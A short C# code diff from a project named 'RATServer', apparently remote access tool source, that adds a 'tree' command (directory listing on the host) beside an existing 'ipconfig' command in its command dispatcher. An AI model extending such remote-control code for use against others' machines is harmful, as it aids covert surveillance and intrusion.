@@ -112,6 +112,9 @@ namespace RATServer
                         case "ipconfig":
                             r = Functions.IPConfig();
                             break;
+                        case "tree":
+                            r = Functions.Tree(c.Args[0]);
+                            break;
                         default:
                             break;
                     }                 
